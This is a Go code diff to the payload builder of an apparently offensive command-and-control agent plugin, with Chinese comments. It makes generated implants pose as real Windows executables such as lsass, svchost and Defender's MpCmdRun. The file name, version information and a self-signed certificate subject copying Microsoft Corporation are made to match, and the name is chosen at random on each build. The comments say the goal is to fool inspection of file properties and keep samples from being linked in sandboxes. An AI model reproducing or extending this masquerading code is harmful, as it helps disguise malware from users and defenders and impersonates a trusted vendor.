@@ -480,6 +480,71 @@ func resolveShellcodeBin(moduleDir string, protocol string, binName string) (str
 	return "", fmt.Errorf("shellcode bin %q for protocol %q not found in %q", binName, protocol, moduleDir)
 }
 
+// benignExe —— 生成产物"伪装成哪个正常 Windows 程序"的**唯一来源**。
+//
+// ★★ 文件名、版本信息、Authenticode 签名主体三处必须**同源**。
+//    以前是三张互不相干的表：文件名从一个池里随机挑、版本信息从 viPool 挑、
+//    签名 CN 又是 `App-%08X` 这种乱码。后果是同一个产物自己打自己：
+//    文件叫 RuntimeBroker.exe、属性里 FileDescription 写着 "Notepad"、
+//    数字签名发给 "CN=App-3F2A1B, O=Vendor-9C21D0" —— 右键看一下属性就露馅，
+//    比不改还糟。
+//
+// ★ 选材：真实存在且**常见**的 Windows 可执行文件 / 服务名，描述与产品名照抄
+//   微软自己的版本资源。名字刻意不带 agent / payload / loader / svc / x64
+//   这类工具标记 —— 那是真实 Windows 进程名里绝不会出现的东西。
+type benignExe struct {
+	name    string // 不含扩展名；同时用作 OriginalFilename 与 InternalName
+	desc    string // FileDescription
+	product string // ProductName
+}
+
+var benignExePool = []benignExe{
+	{"RuntimeBroker", "Runtime Broker", "Microsoft® Windows® Operating System"},
+	{"WmiPrvSE", "WMI Provider Host", "Microsoft® Windows® Operating System"},
+	{"taskhostw", "Host Process for Windows Tasks", "Microsoft® Windows® Operating System"},
+	{"dllhost", "COM Surrogate", "Microsoft® Windows® Operating System"},
+	{"conhost", "Console Window Host", "Microsoft® Windows® Operating System"},
+	{"SearchIndexer", "Microsoft Windows Search Indexer", "Microsoft® Windows® Operating System"},
+	{"SearchProtocolHost", "Microsoft Windows Search Protocol Host", "Microsoft® Windows® Operating System"},
+	{"SearchFilterHost", "Microsoft Windows Search Filter Host", "Microsoft® Windows® Operating System"},
+	{"backgroundTaskHost", "Background Task Host", "Microsoft® Windows® Operating System"},
+	{"SettingSyncHost", "Host Process for Setting Synchronization", "Microsoft® Windows® Operating System"},
+	{"TextInputHost", "Windows Input Experience", "Microsoft® Windows® Operating System"},
+	{"StartMenuExperienceHost", "Start Menu Experience Host", "Microsoft® Windows® Operating System"},
+	{"ShellExperienceHost", "Windows Shell Experience Host", "Microsoft® Windows® Operating System"},
+	{"sihost", "Shell Infrastructure Host", "Microsoft® Windows® Operating System"},
+	{"SecurityHealthService", "Windows Security Service", "Microsoft® Windows® Operating System"},
+	{"SecurityHealthSystray", "Windows Security notification icon", "Microsoft® Windows® Operating System"},
+	{"SgrmBroker", "System Guard Runtime Monitor Broker", "Microsoft® Windows® Operating System"},
+	{"DeviceAssociationService", "Device Association Service", "Microsoft® Windows® Operating System"},
+	{"audiodg", "Windows Audio Device Graph Isolation", "Microsoft® Windows® Operating System"},
+	{"ctfmon", "CTF Loader", "Microsoft® Windows® Operating System"},
+	{"spoolsv", "Spooler SubSystem App", "Microsoft® Windows® Operating System"},
+	{"svchost", "Host Process for Windows Services", "Microsoft® Windows® Operating System"},
+	{"fontdrvhost", "Usermode Font Driver Host", "Microsoft® Windows® Operating System"},
+	{"WUDFHost", "Windows Driver Foundation - User-mode Driver Framework Host Process", "Microsoft® Windows® Operating System"},
+	{"WmiApSrv", "WMI Performance Adapter", "Microsoft® Windows® Operating System"},
+	{"smartscreen", "Windows Defender SmartScreen", "Microsoft® Windows® Operating System"},
+	{"MpCmdRun", "Microsoft Malware Protection Command Line Utility", "Microsoft® Windows® Operating System"},
+	{"Explorer", "Windows Explorer", "Microsoft® Windows® Operating System"},
+	{"notepad", "Notepad", "Microsoft® Windows® Operating System"},
+	{"taskmgr", "Task Manager", "Microsoft® Windows® Operating System"},
+	{"cmd", "Windows Command Processor", "Microsoft® Windows® Operating System"},
+	{"winlogon", "Windows Logon Application", "Microsoft® Windows® Operating System"},
+	{"services", "Services and Controller app", "Microsoft® Windows® Operating System"},
+	{"lsass", "Local Security Authority Process", "Microsoft® Windows® Operating System"},
+	{"dwm", "Desktop Window Manager", "Microsoft® Windows® Operating System"},
+	{"LogonUI", "Windows Logon User Interface Host", "Microsoft® Windows® Operating System"},
+}
+
+// microsoftSignSubject 是伪签名用的证书主体 —— 照抄微软自家 Authenticode 证书的
+// 结构。★ 它只是**外观**：自签名的根不在任何信任链里，签名校验（signtool verify
+// / 驱动加载 / 部分 EDR 的签名策略）依然判为不受信任。它的作用是让"右键 → 数字签名"
+// 那一栏看起来和一份正常 Windows 程序一致，而不是 `CN=App-3F2A1B`。
+func microsoftSignSubject() string {
+	return "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/OU=Microsoft Corporation/CN=Microsoft Windows"
+}
+
 func generateRandomString(n int) string {
 	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 	b := make([]byte, n)
@@ -987,12 +1052,15 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	if generateConfig.Arch == "x86" {
 		Ext = ".x86.o"
 		stubPath = currentDir + "/" + ObjectDir + "/stub.x86.bin"
-		Filename = "agent.x86"
 	} else {
 		Ext = ".x64.o"
 		stubPath = currentDir + "/" + ObjectDir + "/stub.x64.bin"
-		Filename = "agent.x64"
 	}
+	// 本次生成伪装成哪个程序 —— **只在这里取一次**，文件名 / 版本信息 / 签名主体
+	// 三处全部用它，保证同一个产物自己前后一致。
+	// 每次生成随机取（不是固定一个）：固定名会让多份样本在目标机/沙箱里互相关联。
+	chosen := benignExePool[rand.IntN(len(benignExePool))]
+	Filename = chosen.name
 
 	svcName := ""
 	for _, char := range generateConfig.SvcName {
@@ -1063,7 +1131,8 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	} else if generateConfig.Format == "Service Exe" {
 		Files += ObjectDir + "/main_service" + Ext + " "
 		buildPath = tempDir + "/svc.exe"
-		Filename = "svc_" + Filename + ".exe"
+		// 不叫 svc_xxx.exe：svc_ 前缀本身就是"服务版载荷"的标记，真实服务名里没有它
+		Filename += ".exe"
 		postLibs += " -lkernel32 -ladvapi32 -luser32 -lpsapi -lws2_32 -liphlpapi"
 		if iatHide {
 			postLibs += ""
@@ -1216,18 +1285,16 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		vPatch := int((vfRand >> 5) & 0xFFF)
 		vBuild := int((vfRand >> 17) & 0x7FFF)
 
+		// ★ 版本信息必须来自上面那次 chosen —— 单独再挑一个的话，就会出现
+		//   "文件叫 RuntimeBroker.exe、属性里写着 Notepad" 这种自相矛盾。
 		type viEntry struct{ company, desc, internal, orig, product string }
-		viPool := []viEntry{
-			{"Microsoft Corporation", "Host Process for Windows Services", "svchost", "svchost.exe", "Microsoft Windows Operating System"},
-			{"Microsoft Corporation", "Windows Explorer", "explorer", "explorer.exe", "Microsoft Windows Operating System"},
-			{"Microsoft Corporation", "Windows Command Processor", "cmd", "cmd.exe", "Microsoft Windows Operating System"},
-			{"Microsoft Corporation", "Notepad", "notepad", "notepad.exe", "Microsoft Windows Operating System"},
-			{"Microsoft Corporation", "Windows Logon Application", "winlogon", "winlogon.exe", "Microsoft Windows Operating System"},
-			{"Microsoft Corporation", "WMI Provider Host", "WmiPrvSE", "WmiPrvSE.exe", "Microsoft Windows Operating System"},
-			{"Microsoft Corporation", "Spooler SubSystem App", "spoolsv", "spoolsv.exe", "Microsoft Windows Operating System"},
-			{"Microsoft Corporation", "Windows Task Manager", "taskmgr", "taskmgr.exe", "Microsoft Windows Operating System"},
+		vi := viEntry{
+			"Microsoft Corporation",
+			chosen.desc,
+			chosen.name,
+			chosen.name + ".exe",
+			chosen.product,
 		}
-		vi := viPool[int(vfRand>>20)%len(viPool)]
 
 		rcContent := "1 VERSIONINFO\n" +
 			fmt.Sprintf("FILEVERSION     %d,%d,%d,%d\n", vMajor, vMinor, vPatch, vBuild) +
@@ -1365,7 +1432,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		} else {
 			signedPath := tempDir + "/file_signed.exe"
 			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Applying random self-signed Authenticode (openssl + osslsigncode)...")
-			if err := applySelfSignedAuthenticode(buildPath, signedPath, tempDir); err != nil {
+			if err := applySelfSignedAuthenticode(buildPath, signedPath, tempDir, microsoftSignSubject()); err != nil {
 				_ = os.RemoveAll(tempDir)
 				return nil, "", err
 			}
